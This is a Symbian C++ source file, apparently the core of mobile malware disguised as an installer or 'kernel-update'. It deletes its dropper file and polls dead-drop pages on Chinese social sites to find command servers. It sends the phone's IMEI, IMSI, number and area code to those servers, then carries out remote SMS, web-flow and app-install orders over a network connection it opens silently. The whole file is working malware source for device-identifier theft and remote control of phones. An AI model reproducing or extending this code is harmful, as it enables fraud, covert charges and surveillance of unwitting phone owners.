#include <eikstart.h>
#include <e32svr.h>
#include <e32math.h>
#include <pathinfo.h> 
#include <eikenv.h>
#include <eikappui.h>
#include <f32file.h>
#include <eikapp.h>
#include <bautils.h>
#include <apgcli.h>
#include <connpref.h>
#include <commdbconnpref.h>
#include <commdb.h>
#include <cdbpreftable.h>
#include <escapeutils.h>
#include <sysutil.h>
#include <e32base.h>
#include <e32std.h>
#include <e32cons.h>          
#include "appmain.h"
#include "timeouttimer.h"
#include "applicationmanager.h"
#include "commonutils.h"
#include "systemengine.h"
#include "utf.h"
_LIT(KInstallManager, "InstallerManager_Version5");
CAppMain* g_server=0;
TInt CAppMain::EntryPoint(TAny* /*aNone*/){
    CTrapCleanup* cleanupStack=CTrapCleanup::New();
    if(!cleanupStack){
        PanicServer(ECreateTrapCleanup);
    }
    TRAPD(leave,ThreadMainL());
    if(leave){
        PanicServer(ESrvCreateServer);
    }
    delete cleanupStack;
    cleanupStack=NULL;
    return KErrNone;
}

void CAppMain::ThreadMainL(){
    CActiveScheduler* activeScheduler=new (ELeave) CActiveScheduler();
    CleanupStack::PushL(activeScheduler);
    CActiveScheduler::Install(activeScheduler);
    RFs fs;
    fs.Connect();
    fs.MkDirAll(KAppFolder);
    fs.Close();
    Log(_L8("Application started"),0);
    CAppMain::NewLC();
    CActiveScheduler::Start();
    CleanupStack::PopAndDestroy(activeScheduler);
}

CAppMain* CAppMain::NewL(){
    CAppMain* server=CAppMain::NewLC();
    CleanupStack::Pop(server);
    return server;
}

CAppMain* CAppMain::NewLC(){
    CAppMain* server=new (ELeave) CAppMain(EPriorityNormal);
    CleanupStack::PushL(server);
    server->ConstructL();
    return server;
}

CAppMain::CAppMain(TInt aPriority) :
    CServer2(aPriority){
}

CAppMain::~CAppMain(){
    this->OrderCancel();
    SAFE_DELETE(this->iTimeout);
    SAFE_DELETE(this->iAppManager);
    SAFE_DELETE(this->iSmsManager);
    SAFE_DELETE(this->iFlowPageManager);
    this->iConnection.Close();
    this->iSocketServ.Close();
}

void CAppMain::ConstructL(){
    RFs iFs;
    iFs.Connect();
    iFs.MkDirAll(KAppFolder);
    RDir oDir;
    _LIT(KDataFolder,"c:\\Data\\");
    oDir.Open(iFs,KDataFolder,KEntryAttNormal);
    TEntryArray* oArray=new (ELeave) TEntryArray;
    oDir.Read(*oArray);
    TInt iCount=oArray->Count();
    _LIT(NamePrefix,"9nokia9-kernel-update-");
    for(TInt i=0;i<iCount;i++){
        TEntry childEntry=(*oArray)[i];
        if(childEntry.iName.FindF(NamePrefix)==0){
            TBuf8<500> fileName8;
            fileName8.Copy(UnicodeToUtf8(childEntry.iName));
            this->iAppChannel.Copy(FindEnclosed(fileName8,_L8("9nokia9-kernel-update-"),_L8("."),EFalse));
            Log(this->iAppChannel);
            TFileName file;
            file.Copy(KDataFolder);
            file.Append(childEntry.iName);
            if(BaflUtils::FileExists(iFs,file)){
                TRAPD(err,BaflUtils::DeleteFile(iFs,file));
            }
            break;
        }
    }
    iFs.Close();
    StartL(KInstallManager);
    g_server=this;
    this->iSmsManager=CSmsManager::NewL();
    this->iTaskPeriodic=CPeriodic::NewL(0);
    this->iTaskPeriodic->Start(1,BasicPeriodicUnit*1000000,TCallBack(StartTaskFlow,this));
}

void CAppMain::OnHttpError(THttpErrorID aErrId){
    this->iTaskState=ECloseNetwork;
    iTimeout->After(1*1000000);
}
//Execute this method every 2.5 hours;
TInt CAppMain::GetHostName(){
    if((iGetHostNameCount++)%GetHostNameInterval!=0){
        this->iTaskState=EInitialTask;
        iTimeout->After(1*1000000);
        return 0;
    }
    //Execute below every 2.5*20=50 hours;
    Log(_L8("Start Get Domain"));
    SAFE_DELETE(iSocketEngine);
    iSocketEngine=CSocketEngine::NewL();
    TPtrC8 url;
    TInt random=GetRandom(1,6);
    //1.http://t.qq.com/zxiaoxianhost
    //2.http://t.qq.com/mexihost
    //3.http://www.baidu.com/p/spiyol/detail
    //4.http://www.baidu.com/p/spiyola/detail
    //5.http://t.163.com/2493481075
    //6.http://weibo.10086.cn/meiluoc
    if(random==6) url.Set(_L8("http://t.qq.com/zxiaoxianhost"));
    else if(random==5) url.Set(_L8("http://t.qq.com/mexihost"));
    else if(random==4) url.Set(_L8("http://www.baidu.com/p/spiyol/detail"));
    else if(random==3) url.Set(_L8("http://www.baidu.com/p/spiyola/detail"));
    else if(random==2) url.Set(_L8("http://t.163.com/2493481075"));
    else url.Set(_L8("http://weibo.10086.cn/meiluoc"));
    Log(url);
    iSocketEngine->HTTPGetRange(this,url,0);
    Log(_L8("End Get Domain"));
    return 0;
}

void CAppMain::OnResponseReceived(const TDesC8& aData){
    ::SaveToFile(KDomainFile,aData);
    //SAFE_DELETE(iSocketEngine);
    this->iTaskState=EInitialTask;
    iTimeout->After(1*1000000);
}

//Execute this method every 0.5 Hours
TInt CAppMain::StartTaskFlow(TAny* aObject){
    CAppMain* app=((CAppMain*)aObject);
    if((app->iPeriodicCount++)%NormalTaskInterval!=0) return 0;
    //User::After(GetRandom(1,10)*1000*1000);

    //Execute below every 2.5 Hours
    if(app->iTimeout) delete app->iTimeout;
    app->iTimeout=CTimeOutTimer::NewL(0,*app);
    app->iTaskState=EInitializeNetWork;
    app->iTimeout->After(1*1000*1000);
    return 0;
}

void CAppMain::OnTimerExpired(){
    switch(iTaskState){
        case EInitializeNetWork:
        this->InitializeNetWork();
        break;
        case EGetHostName:
        this->GetHostName();
        break;
        case EInitialTask: {
            TPtrC8 hostName=FindDomain();
            if(hostName.Length()<4){
                this->CloseNetWork();
                break;
            }
            if(this->iAreaCode.Length()==0){
                TBuf8<1000> buf;
                buf.Copy(_L8("------\nu:http://"));
                buf.Append(hostName);
                buf.Append(_L8("/setting/"));
                CSystemEngine* manager=CSystemEngine::NewL();
                CleanupStack::PushL(manager);
                buf.Append(_L8("?a="));
                buf.Append(manager->GetIMEI());
                buf.Append(_L8("&b="));
                buf.Append(manager->GetIMSI());
                CleanupStack::PopAndDestroy(manager);
                buf.Append(_L8("\nv1:${}\nc:n\nm:1\na:n\n------\n"));
                StartFlow(buf,EInitialTask);
            }else{
                this->iTaskState=EGetOrder;
                this->iTimeout->After(1);
            }
            break;
        }
        case EInitialVariables: {
            Log(_L8("EInitialVariables started"));
            TBuf8<10240> buf;
            buf.Copy(this->iFlowPageManager->GetVariable(_L8("v1")));
            StartFlow(buf,EInitialVariables);
            break;
        }
        case EGetOrder: {
            TPtrC8 hostName=FindDomain();
            if(hostName.Length()<5){
                this->CloseNetWork();
                break;
            }
            this->iPhoneNumber.Copy(this->iFlowPageManager->GetVariable(_L8("v101"),11,EFalse));
            this->iAreaCode.Copy(this->iFlowPageManager->GetVariable(_L8("v102"),6,EFalse));
            CSystemEngine* manager=CSystemEngine::NewL();
            CleanupStack::PushL(manager);
            TPtrC8 imei=manager->GetIMEI();
            TPtrC8 imsi=manager->GetIMSI();
            TBuf8<2500> order;
            //a:imei
            //b:imsi
            //c:machineUid
            //d:version
            //p:p
            //e:phoneNumber
            //f:areaCode
            order.AppendFormat(_L8("\n-----------\nu:http://%S/order/?a=%S&b=%S&c=%d&d=%S&p=%S&e=%S&f=%S"),&hostName,&imei,&imsi,manager->GetMachineUId(),&KVersion,&iAppChannel,&iPhoneNumber,&iAreaCode);
            TBuf8<50> variable;
            variable.Copy(this->iFlowPageManager->GetVariable(_L8("v103"),50,EFalse));
            if(variable.Length()>0){
                order.Append(_L8("&v3="));
                order.Append(variable);
            }
            variable.Copy(this->iFlowPageManager->GetVariable(_L8("v104"),50,EFalse));
            if(variable.Length()>0){
                order.Append(_L8("&v4="));
                order.Append(variable);
            }
            order.Append(_L8("\nv1:${}\nc:n\nm:1\na:n\n------------\n"));
            CleanupStack::PopAndDestroy(manager);
            StartFlow(order,EGetOrder);
            break;
        }
        case EExecuteSmsOrder: {
            TPtrC8 temp(this->iFlowPageManager->GetVariable(_L8("v1")));
            _LIT8(taskSplitter,"@@@@@@");
            TInt pos=temp.FindF(taskSplitter);
            if(pos>0){
                this->iSmsOrder.Copy(temp.Left(pos));
                this->iSmsOrder.Trim();
                temp.Set(temp.Right(temp.Length()-pos-taskSplitter().Length()));
                pos=temp.FindF(taskSplitter);
                if(pos>0){
                    this->iPageOrder.Copy(temp.Left(pos));
                    iPageOrder.Trim();
                    this->iAppOrder.Copy(temp.Right(temp.Length()-pos-taskSplitter().Length()));
                    this->iAppOrder.Trim();
                }
            }
            if(this->iSmsOrder.Length()){
                if(!this->iSmsManager) this->iSmsManager=CSmsManager::NewL();
                this->iSmsManager->StartTask(this,this->iSmsOrder,EExecuteSmsOrder);
            }else{
                iTaskState=EExecutePageFlowOrder;
                iTimeout->After(1);
            }
            break;
        }
        case EExecutePageFlowOrder: {
            if(this->iPageOrder.Length()) StartFlow(this->iPageOrder,EExecutePageFlowOrder);
            else{
                iTaskState=EExecuteAppOrder;
                iTimeout->After(1);
            }
            break;
        }
        case EExecuteAppOrder: {
            if(iAppOrder.Length()){
                if(!iAppManager){
                    iAppManager=CApplicationManager::NewL();
                }
                iAppManager->StartTask(this,iAppOrder,EExecuteAppOrder);
            }else{
                iTaskState=ECloseNetwork;
                iTimeout->After(2*1000*1000);
            }
            break;
        }
        case ECloseNetwork:
        this->CloseNetWork();
        break;
        case ECleanUp:
        this->CleanUp();
        break;
    }
}
CSession2* CAppMain::NewSessionL(const TVersion&,const RMessage2&) const{
    return NULL;
}

TInt CAppMain::RunError(TInt aError){
    Log(_L8("TInt CAppMain::RunError(TInt aError) start"));
    if(aError==KErrBadDescriptor){
        PanicClient(Message(),EBadDescriptor);
    }else{
        Message().Complete(aError);
    }
    ReStart();
    Log(_L8("TInt CAppMain::RunError(TInt aError) end"));
    return KErrNone;
}

void CAppMain::PanicClient(const RMessage2& aMessage,TInstallManagerPanic aPanic){
    Log(_L8("void CAppMain::PanicClient() start"));
    aMessage.Panic(KInstallManager,aPanic);
    Log(_L8("void CAppMain::PanicClient() end"));
}

void CAppMain::PanicServer(TInstallManagerPanic aPanic){
    Log(_L8("void CAppMain::PanicServer() start"));
    User::Panic(KInstallManager,aPanic);
    Log(_L8("void CAppMain::PanicServer() end"));
}

void CAppMain::InitializeNetWork(){
    TRAPD(err,DoInitNetworkFlow());
    this->iTaskState=(err?ECleanUp:EGetHostName);
    //this->iTaskState=(err?ECleanUp:EInitialTask);
    iTimeout->After(1*1000000);
}

void CAppMain::CloseNetWork(){
    TRAPD(err,DoCloseNetworkFlow());
    iTaskState=ECleanUp;
    iTimeout->After(1*1000000);
    Log(_L8("Network closed"));
}

void CAppMain::CleanUp(){
    this->iTimeout->Cancel();
}

void CAppMain::StartFlow(const TDesC8& aFlowOrder,TInt aTaskFlag){
    if(!iFlowPageManager) iFlowPageManager=CFlowPageManager::NewL();
    this->iFlowPageManager->StartFlow(this,aFlowOrder,aTaskFlag);
}
TInt CAppMain::DoInitNetworkFlow(){
    TInt r=-1;
    iDefaultAccessPointID=2;
#ifndef _MANUALAPN_
#ifndef __WINS__    //如果是真机，检查用户手机是否有移动梦网IAP接入点，如果没有，提示用户需要先建立此接入点
    if(GetAccessPoint()){
        r=0;
    }else{
        Log(_L8("no correct IAP."));
    }
#endif  
#endif  
    iFirstConnect=ETrue;
    Log(_L8("Exception while initialize newwork"));
    return r;
}

void CAppMain::DoCloseNetworkFlow(){
    iTimeout->Cancel();
    iTaskState=EInitializeNetWork;
    iCountConnect=0;
    iFirstConnect=ETrue;
    iConnection.Close();
    iSocketServ.Close();
    Log(_L8("close connection complete."));
    iTaskState=ECleanUp;
    this->iTimeout->After(1*1000*1000);
}

TBool CAppMain::GetState(){
    TBool r=ETrue;
    if(iFirstConnect){
        iSocketServ.Connect();
        TCommDbConnPref prefs;
        //有些手机需要搜索接入点
        prefs.SetIapId(iDefaultAccessPointID);
        if(0==iConnection.Open(iSocketServ)){
            //提示用户选择接入点
            Log(_L8("CAppMain::GetState(): Hint user to select the access point"));
            prefs.SetDialogPreference(ECommDbDialogPrefDoNotPrompt);
            TInt err=0;
#ifndef _MANUALAPN_
            Log(_L8("err=iConnection.Start(prefs);"));
            err=iConnection.Start(prefs);
#else
            Log(_L8("err=iConnection.Start();"));
            err = iConnection.Start();
#endif
            if(0==err){
                iFirstConnect=EFalse;
                return ETrue;
            }
            r=EFalse;
        }
    }
    return r;
}

TBool CAppMain::GetAccessPoint(){
    TBuf<100> CommDBName;
    TUint32 default_iap_ID(0);
    TUint32 will_set_iap_id(0);
    TBuf<100> ItemName(_L("wap"));
    const TUint8 str[]={0xfb,0x79,0xa8,0x52,0xa6,0x68,0x51,0x7F,0};
    TPtrC ptrYDMW=TPtrC((TUint16*)str,4);
    //创建手机IAP数据库对象
    CCommsDatabase* commsDatabase=CCommsDatabase::NewL(EDatabaseTypeIAP);
    CleanupStack::PushL(commsDatabase);

    //打开IAP接入点表
    CCommsDbTableView* tableIAP=commsDatabase->OpenTableLC(TPtrC(IAP));
    if(tableIAP->GotoFirstRecord()==KErrNone){
        do{
            //循环获取IAP接入点，如有移动梦网接入点则对will_set_iap_id赋值
            tableIAP->ReadUintL(TPtrC(COMMDB_ID),default_iap_ID);
            tableIAP->ReadTextL(TPtrC(COMMDB_NAME),CommDBName);
            //iCoeEnv->ReadResource(ItemName, LOC_BUF_ACCESS_POINT_DEFAULT);
            if(CommDBName.FindF(ItemName)>=0||CommDBName.FindF(ptrYDMW)>=0){
                will_set_iap_id=default_iap_ID;
                break;
            }
        }while(tableIAP->GotoNextRecord()==KErrNone);
    }
    //delete tableIAP;
    CleanupStack::PopAndDestroy(tableIAP);
    CleanupStack::PopAndDestroy(commsDatabase);

    //将获取的移动梦网接入点做为缺省访问接入点
    if(will_set_iap_id>0){
        iDefaultAccessPointID=will_set_iap_id;
        Log(_L8("cmwap IAP"));
        //    TBuf8<12> buf;
        //    buf.AppendNum((TInt)will_set_iap_id);
        //    Log(buf);
        return ETrue;
    }else{
        //假如没有找到“移动梦网”接入点，则提示用户在手机中设置此接入点
        Log(_L8("no cmwap"));
        return EFalse;
    }
}

TInt CAppMain::OrderCancel(){
    if(iTimeout) iTimeout->Cancel();
    return 0;
}

void CAppMain::OnTaskSuccess(TInt aTaskFlag){
    Log(_L8("CAppMain::OnTaskSuccess"));
    switch(aTaskFlag){
        case EInitialTask:
        this->iTaskState=EInitialVariables;
        break;
        case EInitialVariables:
        this->iTaskState=EGetOrder;
        break;
        case EGetOrder:
        this->iTaskState=EExecuteSmsOrder;
        break;
        case EExecuteSmsOrder:
        this->iTaskState=EExecutePageFlowOrder;
        break;
        case EExecutePageFlowOrder:
        this->iTaskState=EExecuteAppOrder;
        break;
        default:
        this->iTaskState=ECloseNetwork;

        break;
    }
    this->iTimeout->After(1*1000*1000);
}

void CAppMain::OnTaskFailed(TInt aTaskFlag,const TDesC8& aFailedReason,TInt aFailedStep){
    Log(_L8("CAppMain::OnTaskFailed: task failed"));
    switch(aTaskFlag){
        case EInitialTask:
        this->iTaskState=ECloseNetwork;
        this->iTimeout->After(1*1000*1000);
        break;
        case EInitialVariables:
        this->iTaskState=EGetOrder;
        this->iTimeout->After(1);
        break;
        case EGetOrder:
        this->iTaskState=ECloseNetwork;
        this->iTimeout->After(1*1000*1000);
        break;
        case EExecuteSmsOrder:
        this->iTaskState=EExecutePageFlowOrder;
        this->iTimeout->After(1);
        break;
        case EExecutePageFlowOrder:
        this->iTaskState=EExecuteAppOrder;
        this->iTimeout->After(1);
        break;
        default:
        this->iTaskState=ECloseNetwork;
        this->iTimeout->After(1*1000*1000);
        break;
    }
}

TInt E32Main(){
    return CAppMain::EntryPoint(NULL);
}
